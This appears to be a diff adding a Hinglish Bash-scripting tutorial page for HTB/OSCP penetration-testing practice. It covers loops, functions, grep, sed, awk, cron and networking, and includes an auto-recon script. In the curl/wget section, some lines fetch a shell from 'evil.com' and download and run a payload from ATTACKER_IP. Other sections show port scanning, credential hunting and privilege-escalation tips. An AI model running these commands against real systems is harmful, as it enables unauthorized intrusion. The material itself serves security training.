+<span class="kw">while</span> [ $count <span class="op">-le</span> 5 ]; <span class="kw">do</span>
+    echo <span class="str">"Count: $count"</span>
+    ((count++))
+<span class="kw">done</span>
+
+<span class="cmt"># Infinite loop (Ctrl+C se rokna)</span>
+<span class="kw">while</span> true; <span class="kw">do</span>
+    echo <span class="str">"[*] Checking..."</span>
+    sleep 5
+<span class="kw">done</span>
+
+<span class="cmt"># File line by line padhna (SUPER USEFUL!)</span>
+<span class="kw">while</span> IFS= read -r line; <span class="kw">do</span>
+    echo <span class="str">"Line: $line"</span>
+<span class="kw">done</span> &lt; userlist.txt
+
+<span class="cmt"># User input loop</span>
+<span class="kw">while</span> true; <span class="kw">do</span>
+    read -p <span class="str">"Command (q=quit): "</span> cmd
+    [ <span class="str">"$cmd"</span> = <span class="str">"q"</span> ] && <span class="kw">break</span>
+    eval <span class="str">"$cmd"</span>
+<span class="kw">done</span></pre>
+  </div>
+
+  <div class="section yellow">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title yellow">🎮 Loop Controls</div>
+    <pre><span class="cmt"># break — loop rok do</span>
+<span class="kw">for</span> i <span class="kw">in</span> {1..100}; <span class="kw">do</span>
+    [ $i -eq 50 ] && <span class="kw">break</span>
+    echo $i
+<span class="kw">done</span>
+
+<span class="cmt"># continue — is iteration skip karo</span>
+<span class="kw">for</span> i <span class="kw">in</span> {1..10}; <span class="kw">do</span>
+    [ $i -eq 5 ] && <span class="kw">continue</span>  <span class="cmt"># 5 skip</span>
+    echo $i
+<span class="kw">done</span>
+
+<span class="cmt"># Nested loops — IP scanner</span>
+<span class="kw">for</span> octet3 <span class="kw">in</span> {1..5}; <span class="kw">do</span>
+    <span class="kw">for</span> octet4 <span class="kw">in</span> {1..254}; <span class="kw">do</span>
+        echo <span class="str">"192.168.$octet3.$octet4"</span>
+    <span class="kw">done</span>
+<span class="kw">done</span></pre>
+
+    <div class="quiz-box">
+      <div class="quiz-header" onclick="toggleQuiz(this)">
+        🧠 MINI QUIZ — ports.txt mein se har port echo karo while loop se <span>▼</span>
+      </div>
+      <div class="quiz-body">
+        <div class="quiz-answer">✅ while IFS= read -r port; do<br>&nbsp;&nbsp;&nbsp;&nbsp;echo "Port: $port"<br>done &lt; ports.txt</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 5: FUNCTIONS ============================= -->
+<div class="tab-content" id="t5">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">🔧 Functions — Reusable Code</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> Function = ek ATM machine. Ek baar banao, baar baar use karo. Teri hacking script mein ek "scan_ports" function bana — jitni IPs chahiye, call karo.</div>
+
+    <div class="two-col">
+      <div>
+        <h3>Function Syntax</h3>
+        <pre><span class="cmt"># Method 1</span>
+<span class="kw">function</span> <span class="fn">say_hello</span>() {
+    echo <span class="str">"Hello Hacker!"</span>
+}
+
+<span class="cmt"># Method 2 (shorter)</span>
+<span class="fn">greet</span>() {
+    echo <span class="str">"Namaste $1"</span>
+}
+
+<span class="cmt"># Call karna</span>
+say_hello
+greet <span class="str">"Karan"</span></pre>
+      </div>
+      <div>
+        <h3>Return Values</h3>
+        <pre><span class="cmt"># Bash mein return = exit code (0-255)</span>
+<span class="fn">check_root</span>() {
+    <span class="kw">if</span> [ $(id -u) -eq 0 ]; <span class="kw">then</span>
+        <span class="kw">return</span> 0   <span class="cmt"># success</span>
+    <span class="kw">else</span>
+        <span class="kw">return</span> 1   <span class="cmt"># fail</span>
+    <span class="kw">fi</span>
+}
+
+check_root && echo "Root hai!" \
+           || echo "Root nahi!"
+
+<span class="cmt"># String return — echo use karo</span>
+<span class="fn">get_date</span>() {
+    echo $(date +%Y-%m-%d)
+}
+today=$(get_date)
+echo "Aaj: $today"</pre>
+      </div>
+    </div>
+
+    <h3>🎯 Real Hacking Functions</h3>
+    <pre><span class="cmt"># Banner — har script mein use karo</span>
+<span class="fn">banner</span>() {
+    echo -e "\e[32m"
+    echo "╔══════════════════════════════╗"
+    echo "║   KARAN's SCRIPT v1.0        ║"
+    echo "║   OSCP ARSENAL               ║"
+    echo "╚══════════════════════════════╝"
+    echo -e "\e[0m"
+}
+
+<span class="cmt"># Info/Warn/Error messages</span>
+<span class="fn">info</span>()  { echo -e "\e[36m[*]\e[0m $1"; }
+<span class="fn">success</span>() { echo -e "\e[32m[+]\e[0m $1"; }
+<span class="fn">warn</span>()  { echo -e "\e[33m[!]\e[0m $1"; }
+<span class="fn">error</span>() { echo -e "\e[31m[-]\e[0m $1"; }
+
+<span class="cmt"># Use karo</span>
+banner
+info    "Scan shuru ho raha hai..."
+success "Port 80 open mila!"
+warn    "Firewall detect hua"
+error   "Connection refused"</pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">📞 Function Arguments + Local Variables</div>
+    <pre><span class="fn">scan_port</span>() {
+    <span class="kw">local</span> host=<span class="var">$1</span>    <span class="cmt"># local = function ke andar hi</span>
+    <span class="kw">local</span> port=<span class="var">$2</span>
+
+    <span class="cmt"># Timeout ke saath port check</span>
+    <span class="kw">if</span> timeout 1 bash -c <span class="str">"echo >/dev/tcp/$host/$port"</span> 2>/dev/null; <span class="kw">then</span>
+        success <span class="str">"Port $port is OPEN on $host"</span>
+        <span class="kw">return</span> 0
+    <span class="kw">else</span>
+        error <span class="str">"Port $port is CLOSED"</span>
+        <span class="kw">return</span> 1
+    <span class="kw">fi</span>
+}
+
+<span class="cmt"># Use karo</span>
+<span class="var">target</span>=<span class="str">"192.168.1.1"</span>
+<span class="kw">for</span> port <span class="kw">in</span> 21 22 80 443 445; <span class="kw">do</span>
+    scan_port $target $port
+<span class="kw">done</span></pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 6: FILES/IO ============================= -->
+<div class="tab-content" id="t6">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">📂 File Operations</div>
+
+    <div class="two-col">
+      <div>
+        <h3>File Read/Write</h3>
+        <pre><span class="cmt"># File mein likhna</span>
+echo "Hello" > file.txt      <span class="cmt"># overwrite</span>
+echo "World" >> file.txt     <span class="cmt"># append</span>
+printf "Line\n" > file.txt
+
+<span class="cmt"># File padhna</span>
+cat file.txt
+cat -n file.txt     <span class="cmt"># line numbers</span>
+head -5 file.txt    <span class="cmt"># pehli 5 lines</span>
+tail -5 file.txt    <span class="cmt"># aakhri 5 lines</span>
+tail -f log.txt     <span class="cmt"># live follow</span>
+
+<span class="cmt"># Line by line loop</span>
+<span class="kw">while</span> IFS= read -r line; <span class="kw">do</span>
+    echo "$line"
+<span class="kw">done</span> < file.txt</pre>
+      </div>
+      <div>
+        <h3>Redirections</h3>
+        <pre><span class="cmt"># stdout → file</span>
+command > output.txt
+
+<span class="cmt"># stderr → file</span>
+command 2> errors.txt
+
+<span class="cmt"># Both → same file</span>
+command &> all.txt
+command > all.txt 2>&1
+
+<span class="cmt"># /dev/null — output khao</span>
+command &>/dev/null
+
+<span class="cmt"># Input from file</span>
+command < input.txt
+
+<span class="cmt"># Here string</span>
+command <<< "input text"
+
+<span class="cmt"># Here document</span>
+cat << EOF
+Line 1
+Line 2
+EOF</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">⚡ Pipes — Command Chaining</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> Pipe (|) = ek factory line. Pehla worker kuch banata hai → doosre ko deta hai → teesre ko. Ek command ka output doosre ka input ban jaata hai.</div>
+
+    <pre><span class="cmt"># Basic pipe</span>
+cat /etc/passwd | grep "root"
+
+<span class="cmt"># Multiple pipes</span>
+cat /etc/passwd | grep "/bin/bash" | cut -d: -f1
+
+<span class="cmt"># Count lines</span>
+cat /etc/passwd | wc -l
+
+<span class="cmt"># Sort + unique</span>
+cat users.txt | sort | uniq
+
+<span class="cmt"># Sort by size, reverse</span>
+ls -la | sort -k5 -rn
+
+<span class="cmt"># nmap output filter</span>
+nmap -sV $target | grep "open" | awk '{print $1,$3}'
+
+<span class="cmt"># Find SUID files (priv esc!)</span>
+find / -perm -4000 2>/dev/null | sort
+
+<span class="cmt"># Port ka state nikaalna</span>
+ss -tlnp | grep "LISTEN" | awk '{print $4}' | cut -d: -f2</pre>
+
+    <h3>tee — Output File mein bhi, Screen pe bhi</h3>
+    <pre>nmap -sV 192.168.1.1 | tee scan_results.txt
+<span class="cmt"># Screen pe bhi dekhega, file mein bhi save hoga</span></pre>
+  </div>
+
+  <div class="section red">
+    <span class="level-badge lv3">LEVEL 3</span>
+    <div class="section-title red">🔍 Find Command (OSCP Mein God-Level)</div>
+    <pre><span class="cmt"># Name se dhundna</span>
+find / -name "flag.txt" 2>/dev/null
+
+<span class="cmt"># Type (f=file, d=dir, l=link)</span>
+find /var -type f -name "*.log" 2>/dev/null
+
+<span class="cmt"># Permission based</span>
+find / -perm -4000 2>/dev/null         <span class="cmt"># SUID files</span>
+find / -perm -2000 2>/dev/null         <span class="cmt"># SGID files</span>
+find / -perm -o+w 2>/dev/null          <span class="cmt"># World-writable</span>
+
+<span class="cmt"># Owner</span>
+find / -user root 2>/dev/null
+find / -group sudo 2>/dev/null
+
+<span class="cmt"># Modified time</span>
+find / -mmin -60 2>/dev/null           <span class="cmt"># Last 60 min mein modified</span>
+find / -newer /etc/passwd 2>/dev/null
+
+<span class="cmt"># Size</span>
+find / -size +1M -size -10M 2>/dev/null
+
+<span class="cmt"># Execute on results</span>
+find / -name "*.sh" -exec ls -la {} \; 2>/dev/null</pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 7: GREP/SED/AWK ============================= -->
+<div class="tab-content" id="t7">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">🔍 grep — Text Search ka Raja</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> grep = detective. 1000 lines mein se woh line dhundh deta hai jo tujhe chahiye. OSCP mein log analysis, credential hunting, output filtering — sab grep se!</div>
+
+    <pre><span class="cmt"># Basic</span>
+grep <span class="str">"root"</span> /etc/passwd
+grep <span class="str">"password"</span> config.txt
+
+<span class="cmt"># Case insensitive</span>
+grep <span class="flag">-i</span> <span class="str">"admin"</span> users.txt
+
+<span class="cmt"># Invert (match nahi karo)</span>
+grep <span class="flag">-v</span> <span class="str">"#"</span> /etc/ssh/sshd_config    <span class="cmt"># comments hata ke dekhna</span>
+
+<span class="cmt"># Line number</span>
+grep <span class="flag">-n</span> <span class="str">"error"</span> app.log
+
+<span class="cmt"># Count</span>
+grep <span class="flag">-c</span> <span class="str">"failed"</span> auth.log
+
+<span class="cmt"># Recursive (directory search)</span>
+grep <span class="flag">-r</span> <span class="str">"password"</span> /var/www/
+
+<span class="cmt"># Only filename print karo</span>
+grep <span class="flag">-l</span> <span class="str">"admin"</span> /etc/*.conf
+
+<span class="cmt"># Regex</span>
+grep <span class="flag">-E</span> <span class="str">"^[0-9]"</span> file.txt         <span class="cmt"># number se shuru</span>
+grep <span class="flag">-E</span> <span class="str">"[0-9]{1,3}\.[0-9]{1,3}"</span> file.txt  <span class="cmt"># IP pattern</span>
+
+<span class="cmt"># Context lines</span>
+grep <span class="flag">-A 3</span> <span class="str">"error"</span> log.txt          <span class="cmt"># 3 lines baad</span>
+grep <span class="flag">-B 3</span> <span class="str">"error"</span> log.txt          <span class="cmt"># 3 lines pehle</span>
+grep <span class="flag">-C 3</span> <span class="str">"error"</span> log.txt          <span class="cmt"># 3 lines dono taraf</span>
+
+<span class="cmt"># Multiple patterns</span>
+grep <span class="flag">-E</span> <span class="str">"error|fail|denied"</span> auth.log
+
+<span class="cmt"># Credential hunting</span>
+grep <span class="flag">-r</span> <span class="str">"password\|passwd\|secret\|api_key"</span> /var/www/ 2>/dev/null</pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">✂️ sed — Stream Editor (Text Transform)</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> sed = Find & Replace on steroids. Notepad ka Ctrl+H — command line se, aur bahut powerful.</div>
+
+    <pre><span class="cmt"># Basic replace</span>
+sed <span class="str">'s/old/new/'</span> file.txt             <span class="cmt"># sirf pehla match</span>
+sed <span class="str">'s/old/new/g'</span> file.txt            <span class="cmt"># sab match (global)</span>
+
+<span class="cmt"># File modify karna (in-place)</span>
+sed <span class="flag">-i</span> <span class="str">'s/localhost/10.10.10.1/g'</span> config.txt
+
+<span class="cmt"># Line delete karna</span>
+sed <span class="str">'/^#/d'</span> file.txt                  <span class="cmt"># # se shuru lines hata</span>
+sed <span class="str">'/^$/d'</span> file.txt                  <span class="cmt"># empty lines hata</span>
+
+<span class="cmt"># Line number pe action</span>
+sed <span class="str">'5d'</span> file.txt                     <span class="cmt"># 5th line delete</span>
+sed <span class="str">'1,3d'</span> file.txt                   <span class="cmt"># 1-3 delete</span>
+sed <span class="str">'2s/.*/REPLACED/'</span> file.txt       <span class="cmt"># 2nd line replace</span>
+
+<span class="cmt"># Print specific lines</span>
+sed <span class="flag">-n</span> <span class="str">'5,10p'</span> file.txt               <span class="cmt"># lines 5-10</span>
+
+<span class="cmt"># Case insensitive replace</span>
+sed <span class="str">'s/admin/hacker/Ig'</span> file.txt
+
+<span class="cmt"># Real use: hosts file se IPs nikaalna</span>
+cat /etc/hosts | sed <span class="str">'s/\s.*//'</span> | grep -v '^#' | grep -v '^$'</pre>
+  </div>
+
+  <div class="section yellow">
+    <span class="level-badge lv3">LEVEL 3</span>
+    <div class="section-title yellow">🦅 awk — Data Processing God</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> awk = Excel ka power, terminal mein. Columns nikaalo, calculate karo, filter karo — structured data ke liye.</div>
+
+    <pre><span class="cmt"># Basic — columns print</span>
+awk <span class="str">'{print $1}'</span> file.txt             <span class="cmt"># 1st column</span>
+awk <span class="str">'{print $1,$3}'</span> file.txt          <span class="cmt"># 1st and 3rd</span>
+awk <span class="str">'{print NR,$0}'</span> file.txt          <span class="cmt"># line number + line</span>
+
+<span class="cmt"># Delimiter change</span>
+awk <span class="flag">-F:</span> <span class="str">'{print $1}'</span> /etc/passwd       <span class="cmt"># usernames</span>
+awk <span class="flag">-F:</span> <span class="str">'{print $1,$6,$7}'</span> /etc/passwd <span class="cmt"># user, home, shell</span>
+awk <span class="flag">-F,</span> <span class="str">'{print $2}'</span> data.csv          <span class="cmt"># CSV 2nd column</span>
+
+<span class="cmt"># Condition filter</span>
+awk <span class="str">'/root/{print}'</span> /etc/passwd        <span class="cmt"># root wali lines</span>
+awk <span class="flag">-F:</span> <span class="str">'$3 == 0 {print $1}'</span> /etc/passwd  <span class="cmt"># UID=0 users</span>
+awk <span class="str">'$5 > 1000'</span> ls_output.txt          <span class="cmt"># size > 1000</span>
+
+<span class="cmt"># BEGIN/END blocks</span>
+awk <span class="str">'BEGIN{print "START"} {print $1} END{print "DONE"}'</span> file.txt
+
+<span class="cmt"># Count + sum</span>
+awk <span class="flag">-F:</span> <span class="str">'END{print "Total users:", NR}'</span> /etc/passwd
+
+<span class="cmt"># OSCP: nmap output parse</span>
+nmap $target | awk <span class="str">'/open/{print $1,$3}'</span>
+
+<span class="cmt"># OSCP: /etc/passwd se shells</span>
+awk <span class="flag">-F:</span> <span class="str">'$7 ~ /bash|sh/{print $1,$7}'</span> /etc/passwd</pre>
+
+    <div class="quiz-box">
+      <div class="quiz-header" onclick="toggleQuiz(this)">
+        🧠 MINI QUIZ — /etc/passwd mein se sirf UID nikaalo (3rd field, : delimiter) <span>▼</span>
+      </div>
+      <div class="quiz-body">
+        <div class="quiz-answer">✅ awk -F: '{print $3}' /etc/passwd</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section purple">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title purple">✂️ cut, sort, uniq, wc</div>
+    <pre><span class="cmt"># cut — column extract</span>
+cut <span class="flag">-d: -f1</span> /etc/passwd               <span class="cmt"># usernames</span>
+cut <span class="flag">-d, -f2</span> data.csv                   <span class="cmt"># CSV column 2</span>
+cut <span class="flag">-c1-10</span> file.txt                    <span class="cmt"># first 10 chars</span>
+
+<span class="cmt"># sort</span>
+sort file.txt                           <span class="cmt"># alphabetical</span>
+sort <span class="flag">-n</span> numbers.txt                    <span class="cmt"># numeric</span>
+sort <span class="flag">-r</span> file.txt                       <span class="cmt"># reverse</span>
+sort <span class="flag">-u</span> file.txt                       <span class="cmt"># unique (sort + uniq)</span>
+sort <span class="flag">-k2 -n</span> data.txt                   <span class="cmt"># 2nd column se sort</span>
+
+<span class="cmt"># uniq</span>
+uniq file.txt                           <span class="cmt"># duplicates hata (sorted hona chahiye)</span>
+uniq <span class="flag">-c</span> file.txt                       <span class="cmt"># count bhi dikhao</span>
+uniq <span class="flag">-d</span> file.txt                       <span class="cmt"># sirf duplicates dikhao</span>
+sort file.txt | uniq <span class="flag">-c</span> | sort <span class="flag">-rn</span>   <span class="cmt"># frequency count</span>
+
+<span class="cmt"># wc</span>
+wc <span class="flag">-l</span> file.txt                         <span class="cmt"># line count</span>
+wc <span class="flag">-w</span> file.txt                         <span class="cmt"># word count</span>
+wc <span class="flag">-c</span> file.txt                         <span class="cmt"># byte count</span></pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 8: PROCESS/CRON ============================= -->
+<div class="tab-content" id="t8">
+
+  <div class="section green">
+    <span class="level-badge lv1">LEVEL 1</span>
+    <div class="section-title green">⚙️ Process Management</div>
+
+    <pre><span class="cmt"># Running processes</span>
+ps aux                          <span class="cmt"># sab processes</span>
+ps aux | grep "apache"          <span class="cmt"># specific process</span>
+top                             <span class="cmt"># live view</span>
+htop                            <span class="cmt"># better top</span>
+
+<span class="cmt"># Background mein run karo (&)</span>
+./scan.sh &                     <span class="cmt"># background</span>
+jobs                            <span class="cmt"># background jobs dekhna</span>
+fg %1                           <span class="cmt"># foreground mein lao</span>
+bg %1                           <span class="cmt"># background mein bhejo</span>
+
+<span class="cmt"># Kill processes</span>
+kill PID                        <span class="cmt"># gentle kill</span>
+kill -9 PID                     <span class="cmt"># force kill</span>
+killall apache2                 <span class="cmt"># naam se kill</span>
+pkill -f "python"               <span class="cmt"># pattern se kill</span>
+
+<span class="cmt"># Process ID nikalna</span>
+pgrep apache                    <span class="cmt"># PID</span>
+pidof nginx                     <span class="cmt"># PID</span>
+
+<span class="cmt"># Wait for command to finish</span>
+./long_script.sh &
+pid=$!                          <span class="cmt"># background PID</span>
+wait $pid
+echo "Done!"
+
+<span class="cmt"># Timeout</span>
+timeout 30 ./scan.sh            <span class="cmt"># 30 sec ke baad kill</span>
+
+<span class="cmt"># nohup (logout ke baad bhi chalata rahe)</span>
+nohup ./scan.sh > output.log 2>&1 &</pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">⏰ Cron Jobs — Schedule Automation</div>
+    <div class="story"><strong>🎮 ANALOGY:</strong> Cron = alarm clock. "Yeh script raat 2 baje automatically chala" — done. OSCP mein cron job misuse = privilege escalation!</div>
+
+    <pre><span class="cmt"># Cron tab edit karo</span>
+crontab -e                      <span class="cmt"># edit</span>
+crontab -l                      <span class="cmt"># list</span>
+crontab -r                      <span class="cmt"># remove all</span>
+
+<span class="cmt"># CRON FORMAT:</span>
+<span class="cmt"># * * * * * command</span>
+<span class="cmt"># │ │ │ │ │</span>
+<span class="cmt"># │ │ │ │ └── Day of week (0=Sun, 6=Sat)</span>
+<span class="cmt"># │ │ │ └──── Month (1-12)</span>
+<span class="cmt"># │ │ └────── Day of month (1-31)</span>
+<span class="cmt"># │ └──────── Hour (0-23)</span>
+<span class="cmt"># └────────── Minute (0-59)</span>
+
+<span class="cmt"># Examples</span>
+* * * * * /path/script.sh       <span class="cmt"># har minute</span>
+0 * * * * /path/script.sh       <span class="cmt"># har ghante</span>
+0 2 * * * /path/script.sh       <span class="cmt"># raat 2 baje daily</span>
+0 0 * * 0 /path/script.sh       <span class="cmt"># Sunday midnight</span>
+*/5 * * * * /path/script.sh     <span class="cmt"># har 5 minute</span>
+0 9 * * 1-5 /path/script.sh     <span class="cmt"># weekdays 9 AM</span>
+
+<span class="cmt"># System cron files (OSCP check karo!)</span>
+cat /etc/crontab
+ls /etc/cron.d/
+ls /etc/cron.daily/
+ls /etc/cron.hourly/</pre>
+
+    <div class="info-box info-warn">
+      <strong>🎯 OSCP PRIVILEGE ESCALATION TIP</strong>
+      Agar koi cron job root se chal raha hai aur uski script writable hai tujhe — RCE + root shell! Yeh dekh: <code>pspy64</code> tool se cron jobs monitor karo.
+    </div>
+  </div>
+
+  <div class="section red">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title red">📡 Signals + Traps</div>
+    <pre><span class="cmt"># trap — signal catch karo</span>
+<span class="kw">trap</span> <span class="str">"echo 'Ctrl+C pakda!'; exit"</span> SIGINT
+
+<span class="cmt"># Cleanup on exit</span>
+<span class="fn">cleanup</span>() {
+    echo <span class="str">"[*] Cleaning up..."</span>
+    rm -f /tmp/temp_*
+    kill $(jobs -p) 2>/dev/null
+}
+<span class="kw">trap</span> cleanup EXIT
+
+<span class="cmt"># Ignore signals</span>
+<span class="kw">trap</span> <span class="str">""</span> SIGTERM SIGHUP</pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 9: NETWORKING ============================= -->
+<div class="tab-content" id="t9">
+
+  <div class="section green">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title green">🌐 Networking in Bash</div>
+
+    <pre><span class="cmt"># /dev/tcp — Bash ka built-in TCP connection</span>
+<span class="cmt"># No tools needed! Pure bash!</span>
+
+<span class="cmt"># Port check (nc nahi chahiye!)</span>
+<span class="kw">if</span> timeout 2 bash -c <span class="str">"echo >/dev/tcp/192.168.1.1/80"</span> 2>/dev/null; <span class="kw">then</span>
+    echo <span class="str">"Port 80 is OPEN"</span>
+<span class="kw">else</span>
+    echo <span class="str">"Port 80 is CLOSED"</span>
+<span class="kw">fi</span>
+
+<span class="cmt"># Data bhejna</span>
+exec 3&lt;>/dev/tcp/192.168.1.1/80
+echo -e <span class="str">"GET / HTTP/1.0\r\n\r\n"</span> &gt;&3
+cat &lt;&3
+exec 3&lt;&-
+
+<span class="cmt"># Simple port scanner</span>
+<span class="kw">for</span> port <span class="kw">in</span> {1..1024}; <span class="kw">do</span>
+    timeout 0.1 bash -c <span class="str">"echo >/dev/tcp/$ip/$port"</span> 2>/dev/null && \
+    echo <span class="str">"[+] Port $port OPEN"</span>
+<span class="kw">done</span></pre>
+
+    <h3>🖧 Network Info Commands</h3>
+    <pre><span class="cmt"># IP info</span>
+ip a                            <span class="cmt"># all interfaces</span>
+ip route                        <span class="cmt"># routing table</span>
+ifconfig 2>/dev/null            <span class="cmt"># old style</span>
+
+<span class="cmt"># Connections</span>
+ss -tlnp                        <span class="cmt"># listening ports</span>
+ss -tnp                         <span class="cmt"># established connections</span>
+netstat -tlnp 2>/dev/null       <span class="cmt"># alternate</span>
+
+<span class="cmt"># DNS</span>
+nslookup target.com
+dig target.com +short
+host target.com
+
+<span class="cmt"># ARP (LAN devices)</span>
+arp -a
+ip neigh
+
+<span class="cmt"># Ping sweep</span>
+<span class="kw">for</span> ip <span class="kw">in</span> {1..254}; <span class="kw">do</span>
+    ping -c1 -W1 192.168.1.$ip &>/dev/null && \
+    echo <span class="str">"[+] 192.168.1.$ip is UP"</span> &
+<span class="kw">done</span>
+wait</pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv3">LEVEL 3</span>
+    <div class="section-title blue">📡 curl + wget (Web Requests)</div>
+    <pre><span class="cmt"># curl — HTTP requests</span>
+curl http://target.com
+curl <span class="flag">-s</span> http://target.com               <span class="cmt"># silent</span>
+curl <span class="flag">-o</span> output.html http://target.com   <span class="cmt"># save to file</span>
+curl <span class="flag">-I</span> http://target.com               <span class="cmt"># headers only</span>
+curl <span class="flag">-X POST</span> -d <span class="str">"user=admin&pass=test"</span> http://target.com/login
+curl <span class="flag">-H</span> <span class="str">"Authorization: Bearer TOKEN"</span> http://api.target.com
+curl <span class="flag">-L</span> http://target.com              <span class="cmt"># follow redirects</span>
+curl <span class="flag">--proxy</span> http://127.0.0.1:8080 http://target.com  <span class="cmt"># Burp through</span>
+
+<span class="cmt"># wget — download</span>
+wget http://target.com/file.txt
+wget <span class="flag">-q</span> http://target.com/file.txt     <span class="cmt"># quiet</span>
+wget <span class="flag">-r -np -nH</span> http://target.com/    <span class="cmt"># recursive</span>
+wget <span class="flag">-O</span> payload.php http://evil.com/shell.php
+
+<span class="cmt"># File transfer (without tools)</span>
+<span class="cmt"># Attacker machine pe server chalao:</span>
+python3 -m http.server 8000
+
+<span class="cmt"># Target pe download karo:</span>
+curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
+wget http://ATTACKER_IP:8000/payload -O /tmp/payload
+chmod +x /tmp/payload && /tmp/payload</pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 10: HACK SCRIPTS ============================= -->
+<div class="tab-content" id="t10">
+
+  <div class="section red">
+    <div class="section-title red">💀 HACKING AUTOMATION SCRIPTS</div>
+    <p style="color:#aaa;margin-bottom:14px;">Yeh scripts HTB/OSCP practice ke liye hain. Authorized systems pe hi use karo.</p>
+  </div>
+
+  <div class="hack-script">
+    <div class="hack-script-label">SCRIPT 1 — AUTO RECON</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># ================================================================
+# AUTO RECON SCRIPT — Karan's OSCP Tool
+# Usage: ./recon.sh 10.10.10.10
+# ================================================================</span>
+
+<span class="cmt"># Colors</span>
+RED=<span class="str">'\e[31m'</span>; GREEN=<span class="str">'\e[32m'</span>; YELLOW=<span class="str">'\e[33m'</span>
+CYAN=<span class="str">'\e[36m'</span>; BOLD=<span class="str">'\e[1m'</span>; NC=<span class="str">'\e[0m'</span>
+
+<span class="fn">banner</span>() {
+    echo -e "${GREEN}"
+    echo "╔══════════════════════════════════════╗"
+    echo "║     AUTO RECON — KARAN v1.0          ║"
+    echo "║     HTB/OSCP Automation              ║"
+    echo "╚══════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+<span class="fn">info</span>()    { echo -e "${CYAN}[*]${NC} $1"; }
+<span class="fn">success</span>() { echo -e "${GREEN}[+]${NC} $1"; }
+<span class="fn">warn</span>()    { echo -e "${YELLOW}[!]${NC} $1"; }
+<span class="fn">error</span>()   { echo -e "${RED}[-]${NC} $1"; }
+<span class="fn">section</span>() { echo -e "\n${BOLD}${YELLOW}━━━ $1 ━━━${NC}"; }
+
+<span class="kw">if</span> [ $# <span class="op">-lt</span> 1 ]; <span class="kw">then</span>
+    error <span class="str">"Usage: $0 &lt;IP&gt; [output_dir]"</span>
+    exit 1
+<span class="kw">fi</span>
+
+TARGET=<span class="var">$1</span>
+OUTDIR=${2:-"recon_$TARGET"}
+mkdir -p "$OUTDIR"
+
+banner
+info <span class="str">"Target: $TARGET"</span>
+info <span class="str">"Output: $OUTDIR"</span>
+info <span class="str">"Start Time: $(date)"</span>
+
+<span class="cmt"># 1. Ping check</span>
+section <span class="str">"PING CHECK"</span>
+<span class="kw">if</span> ping -c2 -W2 $TARGET &>/dev/null; <span class="kw">then</span>
+    success <span class="str">"$TARGET is UP"</span>
+<span class="kw">else</span>
+    warn <span class="str">"$TARGET not responding to ping (might be filtered)"</span>
+<span class="kw">fi</span>
+
+<span class="cmt"># 2. Quick port scan</span>
+section <span class="str">"QUICK PORT SCAN"</span>
+info <span class="str">"Running fast scan..."</span>
+nmap -T4 --open -p- $TARGET -oN "$OUTDIR/ports.txt" 2>/dev/null
+OPEN_PORTS=$(grep "open" "$OUTDIR/ports.txt" | awk '{print $1}' | cut -d/ -f1 | tr '\n' ',')
+success <span class="str">"Open ports: $OPEN_PORTS"</span>
+
+<span class="cmt"># 3. Service scan</span>
+section <span class="str">"SERVICE DETECTION"</span>
+<span class="kw">if</span> [ <span class="flag">-n</span> <span class="str">"$OPEN_PORTS"</span> ]; <span class="kw">then</span>
+    info <span class="str">"Running service scan on: $OPEN_PORTS"</span>
+    nmap -sV -sC -p${OPEN_PORTS%,} $TARGET -oN "$OUTDIR/services.txt" 2>/dev/null
+    success <span class="str">"Service scan complete"</span>
+<span class="kw">fi</span>
+
+<span class="cmt"># 4. HTTP check</span>
+section <span class="str">"WEB CHECK"</span>
+<span class="kw">for</span> port <span class="kw">in</span> 80 443 8080 8443 8000 8888; <span class="kw">do</span>
+    <span class="kw">if</span> echo "$OPEN_PORTS" | grep -q "$port"; <span class="kw">then</span>
+        info <span class="str">"Web service on port $port found!"</span>
+        curl -sk -I "http://$TARGET:$port" | head -5 | tee -a "$OUTDIR/web_$port.txt"
+        <span class="cmt"># Gobuster</span>
+        info <span class="str">"Running gobuster on port $port..."</span>
+        gobuster dir -u "http://$TARGET:$port" \
+            -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+            -o "$OUTDIR/gobuster_$port.txt" -q 2>/dev/null &
+    <span class="kw">fi</span>
+<span class="kw">done</span>
+
+<span class="cmt"># 5. SMB check</span>
+<span class="kw">if</span> echo "$OPEN_PORTS" | grep -q "445"; <span class="kw">then</span>
+    section <span class="str">"SMB ENUMERATION"</span>
+    info <span class="str">"SMB detected — running enum4linux..."</span>
+    enum4linux -a $TARGET > "$OUTDIR/smb.txt" 2>/dev/null &
+<span class="kw">fi</span>
+
+<span class="cmt"># Wait for background jobs</span>
+wait
+section <span class="str">"SCAN COMPLETE"</span>
+success <span class="str">"All results in: $OUTDIR/"</span>
